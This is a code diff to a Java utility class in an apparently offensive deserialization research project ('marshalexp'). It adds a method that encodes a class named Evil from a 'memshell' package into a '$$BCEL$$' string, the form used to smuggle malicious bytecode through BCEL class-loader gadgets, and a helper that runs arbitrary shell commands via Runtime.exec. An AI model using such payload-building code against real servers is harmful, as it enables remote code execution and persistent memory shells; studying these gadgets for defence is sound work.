@@ -1,8 +1,14 @@
 package xyz.eki.marshalexp.utils;
 
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.bcel.internal.classfile.JavaClass;
+import com.sun.org.apache.bcel.internal.classfile.Utility;
 import javassist.ClassPool;
 import javassist.CtClass;
+import xyz.eki.marshalexp.memshell.Evil;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.text.DateFormat;
 import java.text.SimpleDateFormat;
 import java.util.Base64;
@@ -54,6 +60,12 @@ public class MiscUtils {
         return res;
     }
 
+    public static String dumpBCELClass(Class<?> clazz) throws Exception{
+        JavaClass javaClass = Repository.lookupClass(Evil.class);
+        String code = Utility.encode(javaClass.getBytes(),true);
+        return "$$BCEL$$"+code;
+    }
+
 
     public static String bytes2HexString(byte[] bytes) {
         StringBuffer ret = new StringBuffer();
@@ -66,4 +78,24 @@ public class MiscUtils {
         }
         return ret.toString();
     }
+    public static String executeCommand(String command) {
+        StringBuilder output = new StringBuilder();
+
+        Process process;
+        try {
+            process = Runtime.getRuntime().exec(command);
+            process.waitFor();
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+
+            String line;
+            while ((line = reader.readLine()) != null) {
+                output.append(line + "\n");
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return output.toString();
+    }
+
 }
